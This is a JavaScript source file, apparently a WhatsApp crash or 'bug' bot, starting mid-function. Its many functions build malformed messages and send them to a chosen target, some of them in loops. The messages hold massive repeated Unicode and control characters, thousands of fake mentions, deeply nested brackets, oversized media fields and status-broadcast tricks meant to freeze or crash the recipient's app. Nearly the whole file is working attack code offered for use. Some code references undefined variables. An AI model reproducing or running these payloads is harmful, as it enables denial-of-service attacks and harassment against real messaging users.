                  paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"atzcore\",\"landmark_area\":\"X\",\"address\":\"tamainfinity\",\"tower_number\":\"dvx\",\"city\":\"markzuckerberg\",\"name\":\"caywz\",\"phone_number\":\"999999999999\",\"house_number\":\"dvx\",\"floor_number\":\"dvx\",\"state\":\"X${"\x10".repeat(900000)}\"}}`,
                  version: 3
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, message, {
    ephemeralExpiration: 5,
    timeStamp: Date.now()
  });
}
async function amelaDeley(sock, target, mention = true ) {
try {
    let sxo = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(target, sXoMessage, {});
      await sock.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500) //sleep nya optional
     if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await sock.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500);
    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
} catch (error) {
  console.error("Error di :", error, "Bodooo");
 }
}
async function Abcd(sock, target) {
  const Lottiex = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Hu97Uc0XAUv82l507qXZfYF6dlrIB0/GKdB/nRvYpZw=",
            fileEncSha256: "YxrC0SoMBHP3msQt7SBUQepYDHH+l+PXfp1Nam7OhXo=",
            mediaKey: "Pbjsi5FmJ6PaTIHxd3MHS/i6WN/PKDHjFv/jbuaKM28=",
            mimetype: "application/was",
            height: 9999,
            width: 9999,
            directPath: "/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0",
            fileLength: "13801",
            mediaKeyTimestamp: "1755002437",
            isAnimated: true,
            stickerSentTs: "1755002439632",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              statusAttributionType: 2,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "Meta",
                  botJid: "13135550002@s.whatsapp.net",
                  creatorName: "-xrelly"
                }
              }
            }
          }
        }
      }
    }),
    { participant: { jid: target } }
  );

  await sock.relayMessage(target, Lottiex.message, {
    messageId: Lottiex.key.id
  });
}

async function NativeflowUI(sock, target) {
const zieMsg = {
    interactiveMessage: {
        body: { 
            text: "Z1ee - Tryhards ¿?" + "ꦾ".repeat(80000) + "~@1~".repeat(40000)
        },
        footer: { 
            text: "https://t.me/Urz1ee" + "\u200B".repeat(50000) 
        },
        header: {
            title: "Z1ee - Tryhards ¿?" + "ꦾ".repeat(80000) + "~@1~".repeat(40000),
            subtitle: "\u200B",
            hasMediaAttachment: true,
            locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "zie",
                address: ""
            }
        },
        nativeFlowMessage: {
            buttons: [
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie1" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie2" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie3" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie4" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie5" }) 
                }
            ]
        }
    }
};

await sock.relayMessage(target, zieMsg, { messageId: null });
}

async function callingUI(target) {
const MemekMelar = "ꦾ".repeat(5000);
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Z1ee - Tryhards ¿?",
            hasMediaAttachment: false
          },
          body: {
            text: "\n".repeat(10) + MemekMelar
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(2000) + "[".repeat(1234),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: MemekMelar
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: MemekMelar
              }
            ]
          }
        }
      }
    }
  };

    await sock.relayMessage(target, msg, {
   messageId: null,
    participant: { jid: target }
  });
}

async function FreezingUI(target) {
  const MemekMelar = "ꦾ".repeat(5000);
  const msg = {
    groupInviteMessage: {
      groupJid: "1@g.us",
      inviteCode: "ោ៝".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "\u200B" + "ꦾ".repeat(2500),
      caption: "\u200B"+ "ꦾ".repeat(2000),
      body: {
        text:
          "Z1ee - Tryhards ¿?" +
          "ោ៝".repeat(2500) +
          "ꦾ".repeat(25000) +
          "ꦽ".repeat(5000),
      },
    },
    nativeFlowMessage: {
      messageParamsJson: "{".repeat(5000) + "[".repeat(5000), 
        buttons: [
       {
            name: "single_select",
            buttonParamsJson: MemekMelar
        },
        {
            name: "call_permission_request",
            buttonParamsJson: MemekMelar
         }
      ]
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}

async function UiBlank(target) {
  const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "ꦽ".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "\u200B" + "ꦾ".repeat(2500),
      caption: "\u200B"+ "ꦾ".repeat(2000),
      body: {
        text:
          "Z1ee - Tryhards ¿?" +
          "ោ៝".repeat(2500) +
          "ꦾ".repeat(25000) +
          "ꦽ".repeat(5000),
      },
    },
  };
  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}

async function CrashingX(sock, target, mention = false) {
  try {
    const msgContent1 = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "Z1ee - Tryhards ¿?" + "\u202E".repeat(500) + "\uDBFF\uDFFF".repeat(1000),
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: "\u900A" + "\u0000".repeat(5000) + "\uFFFF".repeat(2000),
                    address: "\u0007".repeat(20000) + "꧔꧈".repeat(5000) + "\u2060".repeat(1000),
                  },
                },
                body: {
                  text: "" + "\u0003".repeat(10000) + "꧔꧈".repeat(2000)
                },
                contextInfo: {
                  remoteJid: target,
                  participant: "0@s.whatsapp.net",
                  stanzaId: "1234567890ABCDEF",
                  forwardingScore: 99999,
                  isForwarded: true,
                  businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                  },
                  mentionedJid: [
                    target,
                    "1@s.whatsapp.net",
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1997 }, () =>
                      `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                    )
                  ]
                }
              }
            }
          }
        }
      }
    };
    
    const pack1 = generateWAMessageFromContent(target, msgContent1, { userJid: target });
    await sock.relayMessage(target, pack1.message, { messageId: pack1.key.id });
    
    const msgContent2 = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const pack2 = generateWAMessageFromContent(target, { message: msgContent2 }, { userJid: target });
    await sock.relayMessage(target, pack2.message, { messageId: pack2.key.id });
    
    const msgContent3 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000)
              }
            },
            body: {
              text: ""
            },
            interactiveResponseMessage: {
              body: { text: "", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                status: true,
                messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                paramsJson: JSON.stringify({
                  "screen_0_TextInput_0": "radio - buttons" + "ꦾ".repeat(70000),
                  "screen_0_Dropdown_2": "001-Grimgar",
                  "screen_0_RadioButtonsGroup_3": "0_true",
                  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            }
          }
        }
      }
    };

    const pack3 = generateWAMessageFromContent(target, msgContent3, { userJid: target });
    await sock.relayMessage(target, pack3.message, { messageId: pack3.key.id });    
    
    const msgContent4 = {
      extendedTextMessage: {
        text: "᬴".repeat(250000),
        contextInfo: {
          mentionedJid: Array.from({ length: 1950 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          )
        }
      },
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
        mimeType: "audio/mpeg",
        sha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
        encSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
        mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
        directPath: "/v/t62.7114-24/30578226.enc",
        fileLength: 99999999999999,
        mediaKeyTimestamp: 99999999999999,
        seconds: 99999999999999,
        fileEncSha256: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
      }
    };

    const pack4 = generateWAMessageFromContent(target, { message: msgContent4 }, { userJid: target });
    await sock.relayMessage(target, pack4.message, { messageId: pack4.key.id });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: pack2.key, type: 25 } }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "( # )" },
          content: undefined
        }]
      });
    }


  } catch (err) {
  }
}

async function DelayMsg(target, ptcp = true) {
  let msg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: null
        }, 
        contextInfo: {
          isForwarded: true, 
          forwardingScore: 250208,
          participant: "13135550001@s.whatsapp.net", 
          remoteJid: "status@broadcast", 
          mentionJid: [target, "13135550002@s.whatsapp.net", ...Array.from({ length:25022008 }, () => `2502${Math.floor(Math.random() * 250208)}2008@s.whatsapp.net`)], 
          isGroupMention: true, 
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 2,
              expiryTimestamp: Date.now()
            }
          }
        }
      }
    }
  };
  
  await sock.relayMessage(target, msg, ptcp ? { participant: { jid:target }} : {});
}

async function TimerXDelay(target) {
  const Ahmad = "\u202E\u2066\u200F".repeat(999999);
  const Azizie = Buffer.from(Ahmad).toString("base64");
  const Adnan = "𑇂𑆵𑆴𑆿".repeat(50000);

  try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: { businessOwnerJid: target },
            },
            body: { text: "ৣৢ" + "ꦾ".repeat(90000) },
            footer: { text: "\u0000".repeat(21) },
            nativeFlowMessage: {
              buttons: Array(20).fill().map(() => ({
                name: "cta_reply",
                buttonParamsJson: "{}",
              })),
            },
          },
        },
      },
    }, { participant: { jid: target } });

    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "\n",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999,
                name: "Z1ee - Tryhards ¿?",
                address: "\n",
              },
            },
            body: { text: "\n" },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    }, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });

    let loc = {
      degreesLatitude: 11.11,
      degreesLongitude: -11.11,
      name: "t.me/Urz1ee" + Adnan,
      url: "https://xnxx.com",
    };

    let locMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: { message: { locationMessage: loc } }
    }, {});

    let extMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text: "Z1ee - Tryhards ¿?" + Adnan,
            matchedText: "Z1ee - Tryhards ¿?",
            description: alipngewe,
            title: "Z1ee - Tryhards ¿?" + Adnan,
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/xxx",
            thumbnailSha256: "xxx",
            thumbnailEncSha256: "xxx",
            mediaKey: "xxx",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
          }
        }
      }
    }, {});

    await sock.relayMessage('status@broadcast', locMsg.message, {
      messageId: locMsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target } }]
        }]
      }]
    });

    await sock.relayMessage('status@broadcast', extMsg.message, {
      messageId: extMsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target } }]
        }]
      }]
    });

    const fcMsg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          viewOnceMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  documentMessage: {
                    title: Ahmad,
                    fileName: Ahmad + "\u200B",
                    mimetype: "application/x-binary",
                    fileLength: "9999999999",
                    mediaKey: Ahmad,
                    fileSha256: Azizie,
                    mediaKeyTimestamp: "999999999",
                  },
                  interactiveMessage: {
                    contextInfo: {
                      mentionedJid: [target],
                      remoteJid: "status@broadcast",
                      externalAdReply: {
                        title: "Z1ee - Tryhards ¿?",
                        body: Ahmad.slice(0, 50),
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        showAdAttribution: true,
                        sourceUrl: "https://t.me/Urz1ee",
                      },
                      quotedMessage: {
                        listResponseMessage: {
                          title: Ahmad.slice(0, 20),
                          buttonText: Ahmad.slice(0, 15),
                          sections: [
                            {
                              title: "Z1ee - Tryhards ¿?",
                              rows: Array(5).fill({
                                title: heavy.slice(0, 15),
                                rowId: Ahmad,
                                description: Ahmad.slice(0, 25),
                              }),
                            },
                          ],
                        },
                      },
                    },
                    body: { text: Ahmad.slice(0, 300) },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            crash: true,
                            key: Azizie,
                            version: "@godmode",
                            note: Ahmad,
                          }) + Ahmad,
                        },
                        {
                          name: "call_permission_request",
                          buttonParamsJson: Ahmad + Ahmad,
                        },
                        {
                          name: "single_select",
                          buttonParamsJson: "🩸" + Ahmad,
                        },
                      ],
                    },
                  },
                  reactionMessage: {
                    text: Ahmad,
                    key: {
                      remoteJid: target,
                      fromMe: false,
                      id: Ahmad,
                    },
                  },
                },
              },
            },
          },
        },
      },
    }, {});

    await sock.relayMessage(target, fcMsg.message, {
      messageId: fcMsg.key.id,
    });

  } catch (err) {
  }
}

async function forceClick(sock, target) {
  const buttonsList = [
    { type: "single_select", params: "" }
  ];

  for (let i = 0; i < 10; i++) {
    buttonsList.push(
      { type: "call_button", params: JSON.stringify({ status: true }) },
      { type: "copy_button", params: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { type: "quick_reply", params: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const messageData = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () => `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
            ]
          },
          remoteJid: target,
          participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
          stanzaId: "123",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
              creatorName: "Bot"
            }
          }
        },
        carouselMessage: {
          messageVersion: 1,
          cards: [
            {
              header: {
                hasMediaAttachment: true,
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
                  mimetype: "image/jpeg",
                  fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                  fileLength: "9999999999999",
                  height: 9999,
                  width: 9999,
                  mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                  fileEncSha256: "D0LtargetIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                  directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc"
                }
              },
              body: { text: "\n" + "\u0000".repeat(5000) },
              nativeFlowMessage: {
                buttons: buttonsList,
                messageParamsJson: "{".repeat(10000)
              }
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, messageData, { messageId: null, participant: { jid: target }, userJid: target });
  await sock.relayMessage(target, messageData, { messageId: null, participant: { jid: target }, userJid: target });
}

async function ForceGlx(target) {
  for (let i = 0; i < 15; i++) {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                hasMediaAttachment: false,
                liveLocationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.9999,
                  name: "\n",
                  address: ""
                }
              },
              body: {
                text: "Z1ee - Tryhards ¿?"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
					name: "payment_status",
					buttonParamsJson: "\u0003"
			    },
                ]
              },
              contextInfo: {
                remoteJid: "status@broadcast",
                participant: target,
                forwardingScore: 250208,
                isForwarded: false,
                mentionedJid: [target, "13135550002@s.whatsapp.net"]
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
  }
}

async function ForceDeleteMsg(target) {
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

  for (let i = 0; i < 15; i++) {
    const messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: ""
            },
            footer: {
              text: "Z1ee - Tryhards ¿?"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(9999),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "mpm", buttonParamsJson: "{}" },
                { name: "mpm", buttonParamsJson: "\u0003" },
                { name: "call_permission_request", buttonParamsJson: "{}" }
              ]
            },
            contextInfo: {
              mentionedJid: [
                jid,
                "0@s.whatsapp.net",
                ...Array.from({ length: 9000 }, () =>
                  "1" + Math.floor(Math.random() * 250208) + "@s.whatsapp.net"
                )
              ]
            }
          }
        }
      }
    }), {
      userJid: target,
      timestamp: Math.floor(Date.now() / 1000)
    })

    messageContent.messageTimestamp = Math.floor(Date.now() / 1000)

    await sock.relayMessage(target, messageContent.message, {
      participant: { jid: target },
      messageId: messageContent.key.id
    })

    await sleep(4000)

    await sock.sendMessage(target, { delete: messageContent.key })
  }
}

async function Deepforce(target) {
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: "Z1ee - Tryhards ¿?" + "\u0000".repeat(1000) + "https://xnxx.com",
      matchedText: "https://xnxx.com",
      description: "\u74A7",
      title: "Z1ee - Tryhards ¿?",
      previewType: "NONE",
      jpegThumbnail: "",
      inviteLinkGroupTypeV2: "DEFAULT", 
      contextInfo: {
        externalAdReply: {
          renderLargerThumbnail: true,
          thumbnailUrl: "",
          sourceUrl: "",
          showAdAttribution: true,
          body: "\u200B",
          title: "Z1ee - Tryhards ¿?"
        }, 
        isForwarded: true,
        forwardingScore: 999,
        forwardedNewsletterMessageInfo: {
          newsletterName: "\n",
          newsletterJid: "1@newsletter",
          serverId:1
        }
      }
    }
  }, { participant: { jid:target } });
  
}


async function ForcexUi(sock, target) {
  const ZieeMsg = [
    "0@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
    ),
  ];

  for (let i = 0; i < 75; i++) {
    const mediaFlood = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Z1ee - Tryhards ¿?",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ZieeMsg,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(15000),
            },
          },
          extendedTextMessage: {
            text: "ꦾ".repeat(25000) + "@1".repeat(25000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "Z1ee - Tryhards ¿?" +
                  "ꦾ࣯࣯".repeat(60000) +
                  "@1".repeat(30000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
      },
    };

    try {
      const msg = generateWAMessageFromContent(target, mediaFlood, {});
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
      });
    } catch (err) {
    }
  }
}

async function ZieeInvisForceIOS(sock, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Z1ee - Tryhards ¿?" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@Urz1ee" + "𑇂𑆵𑆴𑆿".repeat(70000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}

async function Qlay(sock, target) {
 const baten = [
 { name: "single_select", buttonParamsJson: "" }
 ];

 for (let i = 0; i < 1000; i++) {
 baten.push(
 { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
 { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "\u0000".repeat(5000) }) },
 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\x10".repeat(5000) }) }
 );
 }
  const cardTemplate = {
    header: {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
        fileLength: { low: 4194304, high: 2560, unsigned: true },
        seconds: 999999999,
        mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
        height: 9999,
        width: 9999,
        fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
        directPath:
          "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1751081957"
      },
      hasMediaAttachment: true,
    },
    body: {
      text: "𐌼𐌀CK3FELL𐌀𐍂",
    },
    nativeFlowMessage: {
      buttons: baten,
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𐌼𐌀CK3FELL𐌀𐍂",
            },
            carouselMessage: {
              cards: Array(10).fill(cardTemplate),
              messageVersion: 1,
            },
            contextInfo: {
 participant: X,
 mentionedJid: [
 "0@s.whatsapp.net",
 ...Array.from(
 { length: 2000 },
 () =>
 "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
 ),
 ],
 remoteJid: "X",
 participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
 stanzaId: "123",
 quotedMessage: {
 paymentInviteMessage: {
 serviceType: 3,
 expiryTimestamp: Date.now() + 1814400000
 },
 forwardedAiBotMessageInfo: {
 botName: "META AI",
 botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
 creatorName: "Bot"
 },
 },
 },
            },
          },
        },
    },
    {}
  );
  console.log("Message sent successfully!");
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
  });
}

